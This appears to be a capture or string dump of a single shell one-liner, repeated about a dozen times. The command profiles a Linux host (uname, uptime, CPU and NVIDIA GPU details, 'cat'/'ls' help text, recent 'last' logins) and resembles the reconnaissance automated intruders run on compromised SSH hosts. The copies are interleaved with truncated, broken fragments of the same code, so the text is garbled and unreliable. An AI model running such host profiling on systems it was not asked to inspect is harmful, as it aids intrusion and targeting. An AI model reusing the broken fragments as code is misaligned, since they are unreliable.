|| grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
